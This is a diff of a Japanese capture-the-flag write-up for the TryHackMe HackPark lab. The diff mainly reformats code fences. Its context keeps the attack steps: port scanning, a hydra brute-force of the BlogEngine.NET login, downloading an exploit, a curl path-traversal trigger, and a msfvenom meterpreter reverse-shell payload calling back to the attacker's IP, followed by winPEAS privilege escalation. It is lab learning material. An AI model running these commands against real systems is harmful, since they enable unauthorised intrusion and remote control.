@@ -33,14 +33,10 @@ High-quality reconnaissance narrows a large attack surface into a few validated 
 
 ### Not implemented (or log not saved)
 
-```
 
 ## Nmap
-```
+```bash
 nmap -p- -sC -sV -T4 -A -Pn $ip
-```
-
-```
 ✅[21:28][CPU:0][MEM:37][IP:10.11.87.75][/home/n0z0/work/thm]
 🐉 > nmap -p- -sC -sV -T4 -A -Pn $ip
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-19 21:28 JST
@@ -99,7 +95,7 @@ nmap の結果
 
 80とRDPが開いてた
 
-```
+```bash
 ✅[21:28][CPU:0][MEM:37][IP:10.11.87.75][/home/n0z0/work/thm]
 🐉 > nmap -p- -sC -sV -T4 -A -Pn $ip
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-19 21:28 JST
@@ -150,7 +146,7 @@ Nmap done: 1 IP address (1 host up) scanned in 422.24 seconds
 
 特に気になる結果はなし
 
-```
+```bash
 ❌[1:53][CPU:1][MEM:51][IP:10.11.87.75][...me/n0z0/work/thm/hackpark]
 🐉 > nikto -h $ip -Tuning 123456789
 - Nikto v2.5.0
@@ -191,7 +187,7 @@ Nmap done: 1 IP address (1 host up) scanned in 422.24 seconds
 
 hydraのコマンド
 
-```
+```bash
 hydra -l admin -P /usr/share/wordlists/rockyou.txt $ip http-post-form "/Account/login.aspx:__VIEWSTATE=w%2Bs3oi719rzgBAf8KPmekEn3mPuRdbKDsk1tweEU0JQ77BnTVcsHH1wIy%2FpBQh12FWaXSkeviU1n2Bx6iF0RWJnTz8dAryvuX22EAMCg1aSgSZ18m%2Bb8SBA%2Foh%2BjHjeqh92AMdZknPql%2FH2Df73gGNmUxW6COLCNEVuD%2Ba%2Bntr5%2FR4z4&__EVENTVALIDATION=lpdf2SBqn5dBJkwA1DSrXg%2BNgFR8Tab%2FjgiqyKKQpdtXQ2aWnN3uMhTZGeE7VXy6hfbk1uQJu%2BonPmqfEJCuB2tP4xa%2BzsDyjI20QBxw7nV8zVrEq2LmWnHpkNavqm1DUniD9NIuNolVUdFsZdnn7xg%2Bhod8KYonjTuwROX1DwPgRf9Y&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:F=Login failed" -V
 ```
 
@@ -212,7 +208,7 @@ hydra -l admin -P /usr/share/wordlists/rockyou.txt $ip http-post-form "/Account/
 
 脆弱性を検索するとRCE使えそうなものが見つかる
 
-```
+```bash
 ✅[1:56][CPU:1][MEM:52][IP:10.11.87.75][/usr/share/peass/winpeas]
 🐉 > searchsploit BlogEngine.NET 3.3.6
 ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
@@ -230,7 +226,7 @@ Papers: No Results
 
 exploitコードをダウンロードする
 
-```
+```bash
 ✅[1:56][CPU:1][MEM:52][IP:10.11.87.75][/usr/share/peass/winpeas]
 🐉 > searchsploit -m 46353
 ```
@@ -296,7 +292,7 @@ https://blogengine.io/faq/
 
 ncで待ち受けておく
 
-```
+```bash
 ❌[20:49][CPU:1][MEM:50][IP:10.11.87.75][...me/n0z0/work/thm/hackpark]
 🐉 > nc -lvnp 3333
 listening on [any] 3333 ...
@@ -307,14 +303,14 @@ Microsoft Windows [Version 6.3.9600]
 
 下記パスにアクセスするとリバースシェルが刺さる
 
-```
+```bash
 ✅[20:49][CPU:1][MEM:50][IP:10.11.87.75][/home/n0z0]
 🐉 > curl http://10.10.200.118/?theme=../../App_Data/files
 ```
 
 リバースシェル用のシェルを作成しておく
 
-```
+```bash
 msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.11.87.75 LPORT=4443 -f exe -o shell.exe
 ```
 
@@ -338,7 +334,7 @@ msf6 exploit(multi/handler) > run
 
 バージョン確認
 
-```
+```bash
 meterpreter > sysinfo
 Computer        : HACKPARK
 OS              : Windows Server 2012 R2 (6.3 Build 9600).
@@ -355,7 +351,7 @@ mseconsoleからwinpeaseをアップロードする
 
 ※今回はx86windowsだから下記を利用する
 
-```
+```bash
 meterpreter > upload /usr/share/peass/winpeas/winPEASx86_ofs.exe
 [*] Uploading  : /usr/share/peass/winpeas/winPEASx86_ofs.exe -> winPEASx86_ofs.exe
 
@@ -365,7 +361,7 @@ meterpreter > upload /usr/share/peass/winpeas/winPEASx86_ofs.exe
 
 シェルモードに変更してwinpeasを実行する
 
-```
+```bash
 **c:\Windows\Temp>.\winPEASx86_ofs.exe
  [!] If you want to run the file analysis checks (search sensitive information in files), you need to specify the 'fileanalysis' or 'all' argument. Note that this search might take several minutes. For help, run winpeass.exe --help
 ANSI color bit for Windows is not set. If you are executing this from a Windows terminal inside the host you should run 'REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1' and then start a new CMD
@@ -1888,7 +1884,6 @@ Overwrite Message.exe? (Yes/No/All): yes
 
 後はbatの奴を送り込んだら結果見るとフラグ取れる
 
-```
 c:\Windows\Temp>.\winPEAS.bat
 .\winPEAS.bat
 
